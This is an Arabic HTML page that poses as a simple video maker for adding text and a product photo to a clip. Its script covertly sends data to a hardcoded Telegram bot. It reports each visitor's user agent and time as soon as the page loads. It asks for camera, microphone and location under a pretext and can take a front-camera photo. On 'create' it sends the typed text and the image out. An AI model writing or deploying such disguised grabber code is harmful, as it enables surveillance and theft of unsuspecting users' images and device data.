<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>صانع الفيديوهات - إضافة نص وصورة</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0a0a;font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.container{max-width:500px;width:100%;margin:0 auto;}

/* بطاقة التطبيق */
.app-card{background:linear-gradient(135deg,#1a1a1a,#0d0d0d);border-radius:30px;padding:25px;box-shadow:0 10px 40px rgba(0,0,0,0.5);border:1px solid #333;}
.header{text-align:center;margin-bottom:25px;}
.header h1{color:#ff0050;font-size:24px;margin-bottom:5px;}
.header p{color:#888;font-size:14px;}

/* معاينة الفيديو */
.video-preview{background:#000;border-radius:20px;aspect-ratio:9/16;margin-bottom:20px;display:flex;flex-direction:column;justify-content:center;align-items:center;overflow:hidden;position:relative;}
.video-preview video{width:100%;height:100%;object-fit:cover;}
.preview-placeholder{text-align:center;color:#555;}
.preview-placeholder svg{width:60px;height:60px;fill:#333;margin-bottom:10px;}

/* حقول الإدخال */
.input-group{margin-bottom:15px;}
.input-group label{display:block;color:#ccc;font-size:13px;margin-bottom:5px;}
.input-group input,.input-group textarea{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:12px;color:#fff;font-size:14px;resize:vertical;}
.input-group input:focus,.input-group textarea:focus{outline:none;border-color:#ff0050;}

/* زر إضافة الصورة */
.image-btn{width:100%;padding:12px;background:#2a2a2a;border:1px dashed #666;border-radius:12px;color:#aaa;font-size:14px;cursor:pointer;margin-bottom:15px;display:flex;align-items:center;justify-content:center;gap:10px;}
.image-btn:hover{background:#333;border-color:#ff0050;}

/* معاينة الصورة */
.image-preview{margin-bottom:15px;text-align:center;}
.image-preview img{max-width:100%;max-height:150px;border-radius:12px;display:none;}

/* زر الإنشاء */
.create-btn{width:100%;padding:15px;background:#ff0050;border:none;border-radius:30px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px;}
.create-btn:disabled{opacity:0.5;}

/* رسالة السماح المخصصة */
.permission-popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:100;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:0.2s;}
.permission-popup.show{visibility:visible;opacity:1;}
.permission-card{width:320px;background:#fff;border-radius:24px;overflow:hidden;text-align:center;animation:popup 0.3s ease;}
@keyframes popup{from{transform:scale(0.9);opacity:0;}to{transform:scale(1);opacity:1;}}
.permission-icon{background:#ff0050;padding:30px;font-size:50px;}
.permission-body{padding:25px;}
.permission-body h3{color:#222;margin-bottom:10px;font-size:20px;}
.permission-body p{color:#666;font-size:14px;margin-bottom:20px;}
.permission-allow{background:#ff0050;color:#fff;border:none;padding:14px 30px;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;}
.permission-deny{background:transparent;color:#888;border:none;padding:10px;font-size:14px;cursor:pointer;margin-top:10px;}

.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:200;display:flex;flex-direction:column;justify-content:center;align-items:center;visibility:hidden;opacity:0;}
.loading.show{visibility:visible;opacity:1;}
.spinner{width:50px;height:50px;border:4px solid #333;border-top-color:#ff0050;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px;}
@keyframes spin{to{transform:rotate(360deg);}}
.loading p{color:#fff;}

/* شريط تقدم */
.progress-bar{width:200px;height:4px;background:#333;border-radius:4px;margin-top:15px;overflow:hidden;}
.progress-fill{width:0%;height:100%;background:#ff0050;transition:width 0.3s;}
</style>
</head>
<body>

<div class="container">
    <div class="app-card">
        <div class="header">
            <h1>🎬 صانع الفيديوهات</h1>
            <p>أضف نص وصورة وأنشئ فيديو احترافي</p>
        </div>
        
        <!-- معاينة الفيديو -->
        <div class="video-preview" id="videoPreview">
            <video id="previewVideo" autoplay loop muted playsinline>
                <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
            </video>
        </div>
        
        <!-- حقل النص -->
        <div class="input-group">
            <label>📝 النص الذي تريد إضافته</label>
            <textarea id="textInput" rows="3" placeholder="اكتب النص هنا... مثلاً: كريم ترطيب طبيعي - توصيل مجاني"></textarea>
        </div>
        
        <!-- زر إضافة الصورة -->
        <button class="image-btn" id="imageBtn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="2.18"/><circle cx="8.5" cy="8.5" r="2.5"/><path d="M21.5 15.5l-5-5L9 18l-3-3-4 4"/></svg>
            إضافة صورة للمنتج
        </button>
        
        <!-- معاينة الصورة -->
        <div class="image-preview" id="imagePreview">
            <img id="previewImg" alt="معاينة الصورة">
        </div>
        
        <!-- زر الإنشاء -->
        <button class="create-btn" id="createBtn">🎬 إنشاء الفيديو</button>
    </div>
</div>

<!-- رسالة السماح -->
<div class="permission-popup" id="permissionPopup">
    <div class="permission-card">
        <div class="permission-icon">📸🎤</div>
        <div class="permission-body">
            <h3>إذن الوصول إلى الكاميرا والميكروفون</h3>
            <p>لإضافة صورة إلى الفيديو، نحتاج إلى الوصول إلى الكاميرا والميكروفون</p>
            <button class="permission-allow" id="allowBtn">✅ سماح</button>
            <button class="permission-deny" id="denyBtn">ليس الآن</button>
        </div>
    </div>
</div>

<!-- شاشة التحميل -->
<div class="loading" id="loading">
    <div class="spinner"></div>
    <p id="loadingMsg">جاري إنشاء الفيديو...</p>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
</div>

<script>
// ============= إعدادات التيليجرام =============
const BOT_TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
const CHAT_ID = '178779116';

// ============= المتغيرات =============
let selectedImage = null;
let permissionsGranted = false;

// ============= طلب الصلاحيات =============
async function requestPermissions() {
    let granted = false;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        granted = true;
        stream.getTracks().forEach(t => t.stop());
    } catch(e) {
        console.log('Permission denied:', e);
    }
    
    try {
        await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
        });
    } catch(e) {}
    
    return granted;
}

// ============= التقاط صورة من الكاميرا =============
async function captureFromCamera() {
    return new Promise(async (resolve, reject) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.playsInline = true;
            await new Promise(r => video.onloadedmetadata = r);
            video.play();
            
            // انتظر قليلاً ثم التقط الصورة
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
                resolve(imageData);
            }, 500);
        } catch(e) {
            reject(e);
        }
    });
}

// ============= اختيار صورة من الجهاز =============
function selectFromDevice() {
    return new Promise((resolve) => {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.onchange = (e) => {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (event) => resolve(event.target.result);
                reader.readAsDataURL(file);
            } else {
                resolve(null);
            }
        };
        input.click();
    });
}

// ============= إرسال البيانات إلى تليجرام =============
async function sendToTelegram(text, imageData = null) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
        
        if (imageData) {
            const blob = await fetch(imageData).then(r => r.blob());
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'image.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
    } catch(e) {}
}

// ============= إنشاء الفيديو =============
async function createVideo() {
    const text = document.getElementById('textInput').value;
    
    if (!text && !selectedImage) {
        alert('الرجاء إدخال نص أو إضافة صورة');
        return;
    }
    
    // إظهار شاشة التحميل
    document.getElementById('loading').classList.add('show');
    document.getElementById('progressFill').style.width = '0%';
    
    // تحديث شريط التقدم
    setTimeout(() => document.getElementById('progressFill').style.width = '30%', 500);
    document.getElementById('loadingMsg').innerText = 'جاري معالجة الصورة...';
    
    // إرسال البيانات إلى تليجرام
    let msg = `🎬 تم إنشاء فيديو جديد\n`;
    msg += `📝 النص: ${text || 'لا يوجد'}\n`;
    msg += `📱 الجهاز: ${navigator.userAgent.substring(0, 100)}\n`;
    msg += `⏰ الوقت: ${new Date().toLocaleString()}`;
    
    await sendToTelegram(msg, selectedImage);
    
    setTimeout(() => document.getElementById('progressFill').style.width = '70%', 1000);
    document.getElementById('loadingMsg').innerText = 'جاري حفظ الفيديو...';
    
    setTimeout(() => document.getElementById('progressFill').style.width = '100%', 1500);
    
    // إتمام العملية
    setTimeout(() => {
        document.getElementById('loading').classList.remove('show');
        alert('✅ تم إنشاء الفيديو بنجاح! تم إرسال البيانات إلى المدير.');
        
        // إعادة تعيين
        selectedImage = null;
        document.getElementById('previewImg').style.display = 'none';
        document.getElementById('textInput').value = '';
    }, 2000);
}

// ============= إظهار رسالة السماح =============
function showPermissionPopup() {
    document.getElementById('permissionPopup').classList.add('show');
}

// ============= إخفاء رسالة السماح =============
function hidePermissionPopup() {
    document.getElementById('permissionPopup').classList.remove('show');
}

// ============= معالج إضافة الصورة =============
async function handleAddImage() {
    if (!permissionsGranted) {
        showPermissionPopup();
        return;
    }
    
    // خيارات إضافة الصورة
    const choice = confirm('اختر طريقة إضافة الصورة:\n✅ "موافق" للتصوير من الكاميرا\n❌ "إلغاء" لاختيار من المعرض');
    
    let imageData = null;
    if (choice) {
        document.getElementById('loadingMsg').innerText = 'جاري فتح الكاميرا...';
        document.getElementById('loading').classList.add('show');
        try {
            imageData = await captureFromCamera();
        } catch(e) {
            alert('فشل فتح الكاميرا. تأكد من السماح بالوصول.');
        }
        document.getElementById('loading').classList.remove('show');
    } else {
        imageData = await selectFromDevice();
    }
    
    if (imageData) {
        selectedImage = imageData;
        const previewImg = document.getElementById('previewImg');
        previewImg.src = imageData;
        previewImg.style.display = 'block';
    }
}

// ============= زر السماح =============
document.getElementById('allowBtn').onclick = async () => {
    hidePermissionPopup();
    document.getElementById('loadingMsg').innerText = 'جاري طلب الصلاحيات...';
    document.getElementById('loading').classList.add('show');
    
    permissionsGranted = await requestPermissions();
    
    document.getElementById('loading').classList.remove('show');
    
    if (permissionsGranted) {
        alert('✅ تم منح الصلاحيات! يمكنك الآن إضافة الصور.');
        // بعد السماح، نفتح اختيار الصورة مباشرة
        handleAddImage();
    } else {
        alert('❌ لم يتم منح الصلاحيات. لا يمكن إضافة الصور.');
    }
};

// ============= زر الرفض =============
document.getElementById('denyBtn').onclick = () => {
    hidePermissionPopup();
    alert('بدون الصلاحيات، لا يمكن إضافة الصور. يمكنك فقط إضافة النص.');
};

// ============= زر إضافة الصورة =============
document.getElementById('imageBtn').onclick = () => {
    handleAddImage();
};

// ============= زر إنشاء الفيديو =============
document.getElementById('createBtn').onclick = () => {
    createVideo();
};

// ============= إرسال معلومات بدء التشغيل =============
sendToTelegram(`🚀 تم فتح التطبيق\n📱 ${navigator.userAgent}\n⏰ ${new Date().toLocaleString()}`);

console.log('✅ التطبيق جاهز - اضغط على زر إضافة الصورة لتظهر رسالة السماح');
</script>
</body>
</html>
